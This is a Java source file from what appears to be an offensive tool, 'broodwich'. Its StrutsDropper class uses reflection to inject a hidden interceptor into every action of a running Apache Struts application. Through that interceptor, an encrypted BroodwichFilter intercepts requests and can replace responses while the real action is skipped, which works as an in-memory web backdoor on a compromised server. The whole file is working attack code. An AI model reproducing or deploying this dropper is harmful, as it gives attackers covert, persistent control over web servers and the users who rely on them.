package party.itistimeto.broodwich.droppers;

import com.opensymphony.xwork2.ActionContext;
import com.opensymphony.xwork2.ActionInvocation;
import com.opensymphony.xwork2.config.entities.ActionConfig;
import com.opensymphony.xwork2.config.entities.InterceptorMapping;
import com.opensymphony.xwork2.interceptor.Interceptor;
import org.apache.struts2.StrutsStatics;
import org.apache.struts2.dispatcher.Dispatcher;

import javax.servlet.Filter;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.util.*;

//todo: add "request ID" to not dupe requests

public class StrutsDropper implements Interceptor {
    private final Filter filter;

    private StrutsDropper(String encKey) {
        this.filter = new BroodwichFilter(encKey);
    }

    public static void taste(String pattern, String encKey) {
        try {
            // todo: threading
            Map<String, Map<String, ActionConfig>> actionConfigs = Dispatcher.getInstance().getConfigurationManager().getConfiguration().getRuntimeConfiguration().getActionConfigs();
            for(Map.Entry<String, Map<String, ActionConfig>> outerEntry : actionConfigs.entrySet()) {
                for(Map.Entry<String, ActionConfig> innerEntry : outerEntry.getValue().entrySet()) {
                    ActionConfig currentActionConfig = innerEntry.getValue();
                    Field instancesField = currentActionConfig.getClass().getDeclaredField("interceptors");
                    instancesField.setAccessible(true);
                    // todo: is original instance an unmodifiable collection?
                    List<InterceptorMapping> newInterceptors = new LinkedList<InterceptorMapping>((List<InterceptorMapping>) instancesField.get(currentActionConfig));

                    Set<String> mappingNames = new HashSet<String>();
                    for(InterceptorMapping mapping : newInterceptors) {
                        mappingNames.add(mapping.getName());
                    }

                    if (!mappingNames.contains("broodwich")) {
                        newInterceptors.add(new InterceptorMapping("broodwich", new StrutsDropper(encKey)));
                        instancesField.set(currentActionConfig, newInterceptors);
                    }
                }
            }
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void destroy() {
        filter.destroy();
    }

    @Override
    public void init() {
        try {
            // todo: right now BroodwichFilter doesn't use the filterConfig so this is OK, will this always be true?
            filter.init(null);
        } catch (ServletException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String intercept(ActionInvocation invocation) throws Exception {
        // https://stackoverflow.com/a/37808092
        ActionContext invocationContext = invocation.getInvocationContext();
        HttpServletRequest req = (HttpServletRequest) invocationContext.get(StrutsStatics.HTTP_REQUEST);
        HttpServletResponse resp = (HttpServletResponse) invocationContext.get(StrutsStatics.HTTP_RESPONSE);

        // todo: same as with init()
        filter.doFilter(req, resp, null);

        if(resp.getHeaderNames().contains("X-Modified-By")) {
            // don't invoke the action, so we can keep the broodwich-modified resp body
            return null;
        }

        return invocation.invoke();
    }
}
